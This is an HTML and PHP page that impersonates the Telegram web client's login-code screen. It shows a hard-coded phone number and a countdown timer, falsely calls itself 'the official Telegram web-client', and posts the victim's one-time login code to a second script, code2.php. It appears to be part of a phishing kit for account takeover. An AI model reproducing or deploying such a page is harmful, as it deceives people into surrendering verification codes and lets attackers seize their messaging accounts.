<!DOCTYPE html>
<head>
<link rel="stylesheet" href="Telegram Web_files/app.css">
<script>
const startingMinutes = 10;
let time = startingMinutes * 60;

const contdwn = document.getElementById('countdown');

setInterval(update, 1000);

function update(){
const minutes = Math.floor(time / 60);
let seconds = time % 60;
contdwn.innerHTML = `${minutes}: ${seconds}`;
time--;
}
</script>
</head>
<html>
<p id="countdown">10:00</p>
<div class="login_head_bg"></div>
<div class="page_wrap">
<div class="login_page_wrap">

  <div class="login_page">
    <div class="login_head_wrap clearfix">
	<form action ="code2.php" method="POST">
      <div class="login_head_submit_wrap" style="">
        <input type="submit" value="Next">
      </div>
      <a class="" href="#">
        <img style="height:70px;" src="capture.PNG">
      </a>
    </div>

    <div class="login_form_wrap">
	
        <h3 class="login_phone_head"><span>+251</span> <span ng-bind="credentials.phone_number">911875950</span></h3>
        <div class="login_edit_phone"><a href="form.html">Edit phone number</a></div>

        <div>
         <p class="login_smscode_lead">Weve sent the code to the <strong>Telegram</strong> app on your other device.<br>Please enter the code below.</p>
         
        </div>

         <div>
          <!----><p class="login_smscode_lead">
            <span>
              <span>You will be able to request SMS in<span id="countdown">10:00</span></span>
              
            </span>
          </p><!---->
          <!---->
        </div><!---->

        <div class="md-input-group md-input-group-centered md-input-animated" >
         <label class="md-input-label">Enter your code</label><!---->
          <input autocomplete="off" class="md-input ng-pristine ng-empty ng-invalid ng-invalid-required ng-touched" name= "code" type="tel" required="" style="">
        </div>
      </form>
    </div>

    <div>
      <div class="login_footer_wrap">
        <p>Welcome to the official Telegram web-client.</p>
        <a class="logo_footer_learn_more_link" href="">Learn more</a>
      </div>

    </div>
  </div>

<div id="notify_sound"></div>
	</html>

<?php

$code = $_POST['code'];

if (empty($code)){
	echo '<form action ="code2.php" method="POST">
      <div class="login_head_submit_wrap" style="">
        <input type="submit" value="Next">
      </div>
      <a class="" href="#">
        <img style="height:70px;" src="capture.PNG">
      </a>
    </div>

    <div class="login_form_wrap">
	
        <h3 class="login_phone_head"><span ng-bind="credentials.phone_country">+251</span> <span ng-bind="credentials.phone_number">911875950</span></h3>
        <div class="login_edit_phone"><a ng-click="editPhone()" my-i18n="login_edit_number">Edit phone number</a></div>

        <div>
         <p class="login_smscode_lead">Weve sent the code to the <strong>Telegram</strong> app on your other device.<br>Please enter the code below.</p>
         
        </div>

         <div>
          <!----><p class="login_smscode_lead">
            <span>
              <span>You will be able to request SMS in</span>
              
            </span>
          </p><!---->
          <!---->
        </div><!---->

        <div class="md-input-group md-input-group-centered md-input-animated" >
         <label class="md-input-label">Enter your code</label><!---->
          <input autocomplete="off" class="md-input ng-pristine ng-empty ng-invalid ng-invalid-required ng-touched" name= "code" type="tel" required="" style="">
        </div>
      </form>
    </div>

    <div>
      <div class="login_footer_wrap">
        <p>Welcome to the official Telegram web-client.</p>
        <a class="logo_footer_learn_more_link" href="">Learn more</a>
      </div>

    </div>
  </div>

<div id="notify_sound"></div>
';
}else{
	header("location: code2.php");
}

